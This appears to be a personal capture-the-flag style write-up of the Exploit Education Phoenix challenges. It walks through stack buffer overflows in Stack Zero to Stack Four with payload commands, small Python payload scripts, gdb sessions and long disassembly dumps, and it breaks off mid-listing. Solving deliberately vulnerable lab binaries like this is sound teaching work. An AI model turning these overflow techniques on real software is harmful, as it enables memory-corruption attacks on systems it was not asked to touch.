 #WORK IN PROGRESS
 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Challenge 1 - Stack Zero](#challenge-1---stack-zero)
- [Challenge 2 - Stack One](#challenge-2---stack-one)
- [Challenge 3 - Stack Two](#challenge-3---stack-two)
- [Challenge 4 - Stack Three](#challenge-4---stack-three)
- [Challenge 5 - Stack Four](#challenge-5---stack-four)
- [Challenge 6 - Stack Five](#challenge-6---stack-five)
- [Challenge 7 - Stack Six](#challenge-7---stack-six)
- [Challenge 8 - Format Zero](#challenge-8---format-zero)
- [Challenge 9 - Format One](#challenge-9---format-one)
- [Challenge 10 - Format Two](#challenge-10---format-two)
- [Challenge 11 - Format Three](#challenge-10---format-three)
## Introduction

Welcome to my exploit write up on the Pheonix challanges from the website [Exploit Education](https://exploit.education). 

## Challenge 1 - Stack Zero

[Stack Zero Code](https://exploit.education/phoenix/stack-zero/). 

The challenges start easy. All the code does is check if the volatile integer named changeme has been changed after getting user input. It puts the user input into a buffer with a size of 64 bytes. Since the buffer is only 64 bytes and the code does not check to see if the user input is greater than that, all that is needed to exploit the program is to give it an input greater than 64 bytes.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

## Challenge 2 - Stack One

[Stack One Code](https://exploit.education/phoenix/stack-one/). 

This challenge is just as easy as the last. Instead of taking in a user input, the program takes a command-line argument then calls strcpy to copy it into the buffer variable. As an added challenge, the volatile integer now must be changed to a specific value in bytes. Like the last challenge, the buffer is a size 64 bytes meaning it can be overflowed if given a command argument this is a size greater than 64 bytes. If you give the program over 64 'A's it will tell you that the change me variable is not the correct value and what the given value is. The value of changeme is 4 A's in hexcode form.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41414141, we want 0x496c5962
```
Since we now know what the program wants the changeme variable to be. We just need to add that to the end of 64 bytes of A. We need to translate the hex code into ascii to know what to added to the end of the A's. Looking at a hex to ascii chart gets us 49 = I, 6c = l, 59 = Y, and 62 = b.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIlYb
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```
If you put the new characters at the end of the argument string you will see that the challenge is still not complete. The reason for this is because of endianness the system uses little-endian design which flips in the argument that changes the changeme variable. If you account for endianness then the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
### OR

A second simpler way to solve the challenge is to create a python script that prints out the bytes we need instead of going through the trouble of translating them to ascii. Still need to follow endianness.

```python
import sys
fill = b'A' * 64
adr = b'\x62\x59\x6c\x49'
sys.stdout.buffer.write(fill+adr)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero $(python3 stack-one.py)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 3 - Stack Two

[Stack Two Code](https://exploit.education/phoenix/stack-two/). 

For this challenge like the last one, it doesn't use user input. Instead of using a command-line argument too, the program uses an environment variable called, ExploitEducation. It sets a char pointer to where ever the environment variable is set. Then whatever is in the ExploitEducation variable is copied into the variable. buffer, which is a char array with the size of 64 bits. Like the last challenge, the volatile integer must be changed to a specific value in bytes. Since the buffer is a size of 64 bytes like the other challenges, it can be overflowed if given an environment variable that contains a string greater than 64 bytes. To set the environment variable you just put in the command line ExploitEducation = “xxxx” then the program. Like:

```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x41414141, we want 0x0d0a090a
```

If you set the variable over 64 'A's it will tell you that the change me variable is not the correct value and what the given value should be. Unlike the last challenge, the hex code can not be converted to ascii. To set the variable to the right hex code all you need to do is add “\x{hexcode}”. Since the program wants 0x0d0a09 you just need to add \x0a\x09\x0a\x0d, which accounts for endianness, to the end of 64 other characters. That is it, the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x09\x0a\x0d /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 4 - Stack Three

[Stack Three Code](https://exploit.education/phoenix/stack-three/). 

This program like the first gets user input and places it into a buffer variable with a size of 64 bytes. What is different for this program is the volatile integer is a function pointer. So when you overwrite the fp variable then call the function it contains. It will call whatever function with the hex you overwrote the variable with. Which can be any function you want in the program. If you use the objdump program it can tell you all the hexcode for every function in the program. The function we want to call is complete_level.

```bash
user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-three 

/opt/phoenix/amd64/stack-three:     file format elf64-x86-64


Disassembly of section .init:

00000000004004b0 <_init>:
  4004b0:       50                      push   %rax
  4004b1:       e8 ba 01 00 00          callq  400670 <frame_dummy>
  4004b6:       e8 85 02 00 00          callq  400740 <__do_global_ctors_aux>
  4004bb:       58                      pop    %rax
  4004bc:       c3                      retq   

Disassembly of section .plt:

00000000004004c0 <.plt>:
  4004c0:       ff 35 0a 06 20 00       pushq  0x20060a(%rip)        # 600ad0 <_GLOBAL_OFFSET_TABLE_+0x8>
  4004c6:       ff 25 0c 06 20 00       jmpq   *0x20060c(%rip)        # 600ad8 <_GLOBAL_OFFSET_TABLE_+0x10>
  4004cc:       0f 1f 40 00             nopl   0x0(%rax)

00000000004004d0 <printf@plt>:
  4004d0:       ff 25 0a 06 20 00       jmpq   *0x20060a(%rip)        # 600ae0 <printf>
  4004d6:       68 00 00 00 00          pushq  $0x0
  4004db:       e9 e0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004e0 <gets@plt>:
  4004e0:       ff 25 02 06 20 00       jmpq   *0x200602(%rip)        # 600ae8 <gets>
  4004e6:       68 01 00 00 00          pushq  $0x1
  4004eb:       e9 d0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004f0 <puts@plt>:
  4004f0:       ff 25 fa 05 20 00       jmpq   *0x2005fa(%rip)        # 600af0 <puts>
  4004f6:       68 02 00 00 00          pushq  $0x2
  4004fb:       e9 c0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400500 <fflush@plt>:
  400500:       ff 25 f2 05 20 00       jmpq   *0x2005f2(%rip)        # 600af8 <fflush>
  400506:       68 03 00 00 00          pushq  $0x3
  40050b:       e9 b0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400510 <exit@plt>:
  400510:       ff 25 ea 05 20 00       jmpq   *0x2005ea(%rip)        # 600b00 <exit>
  400516:       68 04 00 00 00          pushq  $0x4
  40051b:       e9 a0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400520 <__libc_start_main@plt>:
  400520:       ff 25 e2 05 20 00       jmpq   *0x2005e2(%rip)        # 600b08 <__libc_start_main>
  400526:       68 05 00 00 00          pushq  $0x5
  40052b:       e9 90 ff ff ff          jmpq   4004c0 <.plt>

Disassembly of section .text:

0000000000400530 <_start>:
  400530:       48 31 ed                xor    %rbp,%rbp
  400533:       48 89 e7                mov    %rsp,%rdi
  400536:       48 8d 35 1b 04 20 00    lea    0x20041b(%rip),%rsi        # 600958 <_DYNAMIC>
  40053d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  400541:       e8 00 00 00 00          callq  400546 <_start_c>

0000000000400546 <_start_c>:
  400546:       48 83 ec 08             sub    $0x8,%rsp
  40054a:       48 8b 37                mov    (%rdi),%rsi
  40054d:       48 8d 57 08             lea    0x8(%rdi),%rdx
  400551:       45 31 c9                xor    %r9d,%r9d
  400554:       41 b8 82 07 40 00       mov    $0x400782,%r8d
  40055a:       b9 b0 04 40 00          mov    $0x4004b0,%ecx
  40055f:       bf b5 06 40 00          mov    $0x4006b5,%edi
  400564:       e8 b7 ff ff ff          callq  400520 <__libc_start_main@plt>
  400569:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000400570 <deregister_tm_clones>:
  400570:       55                      push   %rbp
  400571:       b8 18 0b 60 00          mov    $0x600b18,%eax
  400576:       48 3d 18 0b 60 00       cmp    $0x600b18,%rax
  40057c:       48 89 e5                mov    %rsp,%rbp
  40057f:       74 17                   je     400598 <deregister_tm_clones+0x28>
  400581:       b8 00 00 00 00          mov    $0x0,%eax
  400586:       48 85 c0                test   %rax,%rax
  400589:       74 0d                   je     400598 <deregister_tm_clones+0x28>
  40058b:       5d                      pop    %rbp
  40058c:       bf 18 0b 60 00          mov    $0x600b18,%edi
  400591:       ff e0                   jmpq   *%rax
  400593:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400598:       5d                      pop    %rbp
  400599:       c3                      retq   
  40059a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005a0 <register_tm_clones>:
  4005a0:       be 18 0b 60 00          mov    $0x600b18,%esi
  4005a5:       55                      push   %rbp
  4005a6:       48 81 ee 18 0b 60 00    sub    $0x600b18,%rsi
  4005ad:       48 89 e5                mov    %rsp,%rbp
  4005b0:       48 c1 fe 03             sar    $0x3,%rsi
  4005b4:       48 89 f0                mov    %rsi,%rax
  4005b7:       48 c1 e8 3f             shr    $0x3f,%rax
  4005bb:       48 01 c6                add    %rax,%rsi
  4005be:       48 d1 fe                sar    %rsi
  4005c1:       74 15                   je     4005d8 <register_tm_clones+0x38>
  4005c3:       b8 00 00 00 00          mov    $0x0,%eax
  4005c8:       48 85 c0                test   %rax,%rax
  4005cb:       74 0b                   je     4005d8 <register_tm_clones+0x38>
  4005cd:       5d                      pop    %rbp
  4005ce:       bf 18 0b 60 00          mov    $0x600b18,%edi
  4005d3:       ff e0                   jmpq   *%rax
  4005d5:       0f 1f 00                nopl   (%rax)
  4005d8:       5d                      pop    %rbp
  4005d9:       c3                      retq   
  4005da:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005e0 <__do_global_dtors_aux>:
  4005e0:       80 3d 59 05 20 00 00    cmpb   $0x0,0x200559(%rip)        # 600b40 <completed.5577>
  4005e7:       75 77                   jne    400660 <__do_global_dtors_aux+0x80>
  4005e9:       55                      push   %rbp
  4005ea:       48 8b 05 57 05 20 00    mov    0x200557(%rip),%rax        # 600b48 <dtor_idx.5579>
  4005f1:       48 89 e5                mov    %rsp,%rbp
  4005f4:       41 54                   push   %r12
  4005f6:       53                      push   %rbx
  4005f7:       bb 50 09 60 00          mov    $0x600950,%ebx
  4005fc:       41 bc 48 09 60 00       mov    $0x600948,%r12d
  400602:       48 81 eb 48 09 60 00    sub    $0x600948,%rbx
  400609:       48 c1 fb 03             sar    $0x3,%rbx
  40060d:       48 83 eb 01             sub    $0x1,%rbx
  400611:       48 39 d8                cmp    %rbx,%rax
  400614:       73 25                   jae    40063b <__do_global_dtors_aux+0x5b>
  400616:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40061d:       00 00 00 
  400620:       48 83 c0 01             add    $0x1,%rax
  400624:       48 89 05 1d 05 20 00    mov    %rax,0x20051d(%rip)        # 600b48 <dtor_idx.5579>
  40062b:       41 ff 14 c4             callq  *(%r12,%rax,8)
  40062f:       48 8b 05 12 05 20 00    mov    0x200512(%rip),%rax        # 600b48 <dtor_idx.5579>
  400636:       48 39 d8                cmp    %rbx,%rax
  400639:       72 e5                   jb     400620 <__do_global_dtors_aux+0x40>
  40063b:       e8 30 ff ff ff          callq  400570 <deregister_tm_clones>
  400640:       b8 00 00 00 00          mov    $0x0,%eax
  400645:       48 85 c0                test   %rax,%rax
  400648:       74 0a                   je     400654 <__do_global_dtors_aux+0x74>
  40064a:       bf f0 08 40 00          mov    $0x4008f0,%edi
  40064f:       e8 ac f9 bf ff          callq  0 <_init-0x4004b0>
  400654:       5b                      pop    %rbx
  400655:       c6 05 e4 04 20 00 01    movb   $0x1,0x2004e4(%rip)        # 600b40 <completed.5577>
  40065c:       41 5c                   pop    %r12
  40065e:       5d                      pop    %rbp
  40065f:       c3                      retq   
  400660:       f3 c3                   repz retq 
  400662:       0f 1f 40 00             nopl   0x0(%rax)
  400666:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40066d:       00 00 00 

0000000000400670 <frame_dummy>:
  400670:       b8 00 00 00 00          mov    $0x0,%eax
  400675:       48 85 c0                test   %rax,%rax
  400678:       74 1e                   je     400698 <frame_dummy+0x28>
  40067a:       55                      push   %rbp
  40067b:       be 60 0b 60 00          mov    $0x600b60,%esi
  400680:       bf f0 08 40 00          mov    $0x4008f0,%edi
  400685:       48 89 e5                mov    %rsp,%rbp
  400688:       e8 73 f9 bf ff          callq  0 <_init-0x4004b0>
  40068d:       5d                      pop    %rbp
  40068e:       e9 0d ff ff ff          jmpq   4005a0 <register_tm_clones>
  400693:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400698:       e9 03 ff ff ff          jmpq   4005a0 <register_tm_clones>

000000000040069d <complete_level>:
  40069d:       55                      push   %rbp
  40069e:       48 89 e5                mov    %rsp,%rbp
  4006a1:       bf 90 07 40 00          mov    $0x400790,%edi
  4006a6:       e8 45 fe ff ff          callq  4004f0 <puts@plt>
  4006ab:       bf 00 00 00 00          mov    $0x0,%edi
  4006b0:       e8 5b fe ff ff          callq  400510 <exit@plt>

00000000004006b5 <main>:
  4006b5:       55                      push   %rbp
  4006b6:       48 89 e5                mov    %rsp,%rbp
  4006b9:       48 83 ec 60             sub    $0x60,%rsp
  4006bd:       89 7d ac                mov    %edi,-0x54(%rbp)
  4006c0:       48 89 75 a0             mov    %rsi,-0x60(%rbp)
  4006c4:       bf d8 07 40 00          mov    $0x4007d8,%edi
  4006c9:       e8 22 fe ff ff          callq  4004f0 <puts@plt>
  4006ce:       48 c7 45 f0 00 00 00    movq   $0x0,-0x10(%rbp)
  4006d5:       00 
  4006d6:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  4006da:       48 89 c7                mov    %rax,%rdi
  4006dd:       e8 fe fd ff ff          callq  4004e0 <gets@plt>
  4006e2:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006e6:       48 85 c0                test   %rax,%rax
  4006e9:       74 32                   je     40071d <main+0x68>
  4006eb:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006ef:       48 89 c6                mov    %rax,%rsi
  4006f2:       bf 28 08 40 00          mov    $0x400828,%edi
  4006f7:       b8 00 00 00 00          mov    $0x0,%eax
  4006fc:       e8 cf fd ff ff          callq  4004d0 <printf@plt>
  400701:       48 8b 05 18 04 20 00    mov    0x200418(%rip),%rax        # 600b20 <stdout>
  400708:       48 89 c7                mov    %rax,%rdi
  40070b:       e8 f0 fd ff ff          callq  400500 <fflush@plt>
  400710:       48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400714:       b8 00 00 00 00          mov    $0x0,%eax
  400719:       ff d2                   callq  *%rdx
  40071b:       eb 0a                   jmp    400727 <main+0x72>
  40071d:       bf 48 08 40 00          mov    $0x400848,%edi
  400722:       e8 c9 fd ff ff          callq  4004f0 <puts@plt>
  400727:       bf 00 00 00 00          mov    $0x0,%edi
  40072c:       e8 df fd ff ff          callq  400510 <exit@plt>
  400731:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  400738:       00 00 00 
  40073b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000400740 <__do_global_ctors_aux>:
  400740:       48 8b 05 f1 01 20 00    mov    0x2001f1(%rip),%rax        # 600938 <__CTOR_LIST__>
  400747:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40074b:       74 33                   je     400780 <__do_global_ctors_aux+0x40>
  40074d:       55                      push   %rbp
  40074e:       48 89 e5                mov    %rsp,%rbp
  400751:       53                      push   %rbx
  400752:       bb 38 09 60 00          mov    $0x600938,%ebx
  400757:       48 83 ec 08             sub    $0x8,%rsp
  40075b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400760:       48 83 eb 08             sub    $0x8,%rbx
  400764:       ff d0                   callq  *%rax
  400766:       48 8b 03                mov    (%rbx),%rax
  400769:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40076d:       75 f1                   jne    400760 <__do_global_ctors_aux+0x20>
  40076f:       48 83 c4 08             add    $0x8,%rsp
  400773:       5b                      pop    %rbx
  400774:       5d                      pop    %rbp
  400775:       c3                      retq   
  400776:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40077d:       00 00 00 
  400780:       f3 c3                   repz retq 

Disassembly of section .fini:

0000000000400782 <_fini>:
  400782:       50                      push   %rax
  400783:       e8 58 fe ff ff          callq  4005e0 <__do_global_dtors_aux>
  400788:       58                      pop    %rax
  400789:       c3                      retq   
```
 
 As you can see when using objdump you get the hex 0x40069d for the location of the complete_level function. The best way of inputing the user input for the program is to pipe it in using python. Calling python with the -c flag makes it run whatever code is in "". So you can print a string then pipe to the program with the | command. To solve the program all you need to do is append the hex code \x9d\x06\x40, accounting for endianness, at the end of 64 charaters of junk. 
 
```bash
 user@phoenix-amd64:~$ python -c "print('A' * 64 + '\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three  
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
 

## Challenge 5 - Stack Four

[Stack Four Code](https://exploit.education/phoenix/stack-four/). 
 
This challange is the exact same as the last challenge. Expect instead of overwritting a function pointer we have to overwrite a return function. The concept is the same it just requires a little more work. To figure this challenge out we will need to debug the program using gdb. Using gdb we will disassemble the function start_level and place a breakpoint at ret. Then we will run the program and input a string containing the alphabet.

```bash
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50
   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave  
   0x0000000000400669 <+52>:    ret    
End of assembler dump.
(gdb) break *0x4006679
Breakpoint 1 at 0x400669
(gdb) r 
Starting program: /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
(gdb) x/s $rip
0x400669 <start_level+52>:      "\303UH\211\345H\203\354\020\211}\374H\211u\360\277P\a@"
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) si
0x5858585757575756 in ?? ()
(gdb) x/s $rip
0x5858585757575756:     <error: Cannot access memory at address 0x5858585757575756>
 ```
 
 If we check the instruction pointer at the breakpoint it will point to the return function location still. If we then take one step and check the program pounter again it will be pointing to XXXWWWWV. So we can see that we have overwrite the loction the return function was pointing too. We also know where on the string it is being overwritten. The next thing we need to do is get the function's hexcode we want to jump to and place it on the string.  
 
```bash
 user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-four  

/opt/phoenix/amd64/stack-four:     file format elf64-x86-64


Disassembly of section .init:

0000000000400438 <_init>:
  400438:       50                      push   %rax
  400439:       e8 b2 01 00 00          callq  4005f0 <frame_dummy>
  40043e:       e8 5d 02 00 00          callq  4006a0 <__do_global_ctors_aux>
  400443:       58                      pop    %rax
  400444:       c3                      retq   

Disassembly of section .plt:

0000000000400450 <.plt>:
  400450:       ff 35 82 05 20 00       pushq  0x200582(%rip)        # 6009d8 <_GLOBAL_OFFSET_TABLE_+0x8>
  400456:       ff 25 84 05 20 00       jmpq   *0x200584(%rip)        # 6009e0 <_GLOBAL_OFFSET_TABLE_+0x10>
  40045c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400460 <printf@plt>:
  400460:       ff 25 82 05 20 00       jmpq   *0x200582(%rip)        # 6009e8 <printf>
  400466:       68 00 00 00 00          pushq  $0x0
  40046b:       e9 e0 ff ff ff          jmpq   400450 <.plt>

0000000000400470 <gets@plt>:
  400470:       ff 25 7a 05 20 00       jmpq   *0x20057a(%rip)        # 6009f0 <gets>
  400476:       68 01 00 00 00          pushq  $0x1
  40047b:       e9 d0 ff ff ff          jmpq   400450 <.plt>

0000000000400480 <puts@plt>:
  400480:       ff 25 72 05 20 00       jmpq   *0x200572(%rip)        # 6009f8 <puts>
  400486:       68 02 00 00 00          pushq  $0x2
  40048b:       e9 c0 ff ff ff          jmpq   400450 <.plt>

0000000000400490 <exit@plt>:
  400490:       ff 25 6a 05 20 00       jmpq   *0x20056a(%rip)        # 600a00 <exit>
  400496:       68 03 00 00 00          pushq  $0x3
  40049b:       e9 b0 ff ff ff          jmpq   400450 <.plt>

00000000004004a0 <__libc_start_main@plt>:
  4004a0:       ff 25 62 05 20 00       jmpq   *0x200562(%rip)        # 600a08 <__libc_start_main>
  4004a6:       68 04 00 00 00          pushq  $0x4
  4004ab:       e9 a0 ff ff ff          jmpq   400450 <.plt>

Disassembly of section .text:

00000000004004b0 <_start>:
  4004b0:       48 31 ed                xor    %rbp,%rbp
  4004b3:       48 89 e7                mov    %rsp,%rdi
  4004b6:       48 8d 35 d3 03 20 00    lea    0x2003d3(%rip),%rsi        # 600890 <_DYNAMIC>
  4004bd:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  4004c1:       e8 00 00 00 00          callq  4004c6 <_start_c>

00000000004004c6 <_start_c>:
  4004c6:       48 83 ec 08             sub    $0x8,%rsp
  4004ca:       48 8b 37                mov    (%rdi),%rsi
  4004cd:       48 8d 57 08             lea    0x8(%rdi),%rdx
  4004d1:       45 31 c9                xor    %r9d,%r9d
  4004d4:       41 b8 e2 06 40 00       mov    $0x4006e2,%r8d
  4004da:       b9 38 04 40 00          mov    $0x400438,%ecx
  4004df:       bf 6a 06 40 00          mov    $0x40066a,%edi
  4004e4:       e8 b7 ff ff ff          callq  4004a0 <__libc_start_main@plt>
  4004e9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

00000000004004f0 <deregister_tm_clones>:
  4004f0:       55                      push   %rbp
  4004f1:       b8 18 0a 60 00          mov    $0x600a18,%eax
  4004f6:       48 3d 18 0a 60 00       cmp    $0x600a18,%rax
  4004fc:       48 89 e5                mov    %rsp,%rbp
  4004ff:       74 17                   je     400518 <deregister_tm_clones+0x28>
  400501:       b8 00 00 00 00          mov    $0x0,%eax
  400506:       48 85 c0                test   %rax,%rax
  400509:       74 0d                   je     400518 <deregister_tm_clones+0x28>
  40050b:       5d                      pop    %rbp
  40050c:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400511:       ff e0                   jmpq   *%rax
  400513:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400518:       5d                      pop    %rbp
  400519:       c3                      retq   
  40051a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400520 <register_tm_clones>:
  400520:       be 18 0a 60 00          mov    $0x600a18,%esi
  400525:       55                      push   %rbp
  400526:       48 81 ee 18 0a 60 00    sub    $0x600a18,%rsi
  40052d:       48 89 e5                mov    %rsp,%rbp
  400530:       48 c1 fe 03             sar    $0x3,%rsi
  400534:       48 89 f0                mov    %rsi,%rax
  400537:       48 c1 e8 3f             shr    $0x3f,%rax
  40053b:       48 01 c6                add    %rax,%rsi
  40053e:       48 d1 fe                sar    %rsi
  400541:       74 15                   je     400558 <register_tm_clones+0x38>
  400543:       b8 00 00 00 00          mov    $0x0,%eax
  400548:       48 85 c0                test   %rax,%rax
  40054b:       74 0b                   je     400558 <register_tm_clones+0x38>
  40054d:       5d                      pop    %rbp
  40054e:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400553:       ff e0                   jmpq   *%rax
  400555:       0f 1f 00                nopl   (%rax)
  400558:       5d                      pop    %rbp
  400559:       c3                      retq   
  40055a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400560 <__do_global_dtors_aux>:
  400560:       80 3d b9 04 20 00 00    cmpb   $0x0,0x2004b9(%rip)        # 600a20 <completed.5577>
  400567:       75 77                   jne    4005e0 <__do_global_dtors_aux+0x80>
  400569:       55                      push   %rbp
  40056a:       48 8b 05 b7 04 20 00    mov    0x2004b7(%rip),%rax        # 600a28 <dtor_idx.5579>
  400571:       48 89 e5                mov    %rsp,%rbp
  400574:       41 54                   push   %r12
  400576:       53                      push   %rbx
  400577:       bb 88 08 60 00          mov    $0x600888,%ebx
  40057c:       41 bc 80 08 60 00       mov    $0x600880,%r12d
  400582:       48 81 eb 80 08 60 00    sub    $0x600880,%rbx
  400589:       48 c1 fb 03             sar    $0x3,%rbx
  40058d:       48 83 eb 01             sub    $0x1,%rbx
  400591:       48 39 d8                cmp    %rbx,%rax
  400594:       73 25                   jae    4005bb <__do_global_dtors_aux+0x5b>
  400596:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40059d:       00 00 00 
  4005a0:       48 83 c0 01             add    $0x1,%rax
  4005a4:       48 89 05 7d 04 20 00    mov    %rax,0x20047d(%rip)        # 600a28 <dtor_idx.5579>
  4005ab:       41 ff 14 c4             callq  *(%r12,%rax,8)
  4005af:       48 8b 05 72 04 20 00    mov    0x200472(%rip),%rax        # 600a28 <dtor_idx.5579>
  4005b6:       48 39 d8                cmp    %rbx,%rax
  4005b9:       72 e5                   jb     4005a0 <__do_global_dtors_aux+0x40>
  4005bb:       e8 30 ff ff ff          callq  4004f0 <deregister_tm_clones>
  4005c0:       b8 00 00 00 00          mov    $0x0,%eax
  4005c5:       48 85 c0                test   %rax,%rax
  4005c8:       74 0a                   je     4005d4 <__do_global_dtors_aux+0x74>
  4005ca:       bf 08 08 40 00          mov    $0x400808,%edi
  4005cf:       e8 2c fa bf ff          callq  0 <_init-0x400438>
  4005d4:       5b                      pop    %rbx
  4005d5:       c6 05 44 04 20 00 01    movb   $0x1,0x200444(%rip)        # 600a20 <completed.5577>
  4005dc:       41 5c                   pop    %r12
  4005de:       5d                      pop    %rbp
  4005df:       c3                      retq   
  4005e0:       f3 c3                   repz retq 
  4005e2:       0f 1f 40 00             nopl   0x0(%rax)
  4005e6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4005ed:       00 00 00 

00000000004005f0 <frame_dummy>:
  4005f0:       b8 00 00 00 00          mov    $0x0,%eax
  4005f5:       48 85 c0                test   %rax,%rax
  4005f8:       74 1e                   je     400618 <frame_dummy+0x28>
  4005fa:       55                      push   %rbp
  4005fb:       be 40 0a 60 00          mov    $0x600a40,%esi
  400600:       bf 08 08 40 00          mov    $0x400808,%edi
  400605:       48 89 e5                mov    %rsp,%rbp
  400608:       e8 f3 f9 bf ff          callq  0 <_init-0x400438>
  40060d:       5d                      pop    %rbp
  40060e:       e9 0d ff ff ff          jmpq   400520 <register_tm_clones>
  400613:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400618:       e9 03 ff ff ff          jmpq   400520 <register_tm_clones>

000000000040061d <complete_level>:
  40061d:       55                      push   %rbp
  40061e:       48 89 e5                mov    %rsp,%rbp
  400621:       bf f0 06 40 00          mov    $0x4006f0,%edi
  400626:       e8 55 fe ff ff          callq  400480 <puts@plt>
  40062b:       bf 00 00 00 00          mov    $0x0,%edi
  400630:       e8 5b fe ff ff          callq  400490 <exit@plt>

0000000000400635 <start_level>:
  400635:       55                      push   %rbp
  400636:       48 89 e5                mov    %rsp,%rbp
  400639:       48 83 ec 50             sub    $0x50,%rsp
  40063d:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  400641:       48 89 c7                mov    %rax,%rdi
  400644:       e8 27 fe ff ff          callq  400470 <gets@plt>
  400649:       48 8b 45 08             mov    0x8(%rbp),%rax
  40064d:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  400651:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  400655:       48 89 c6                mov    %rax,%rsi
  400658:       bf 33 07 40 00          mov    $0x400733,%edi
  40065d:       b8 00 00 00 00          mov    $0x0,%eax
  400662:       e8 f9 fd ff ff          callq  400460 <printf@plt>
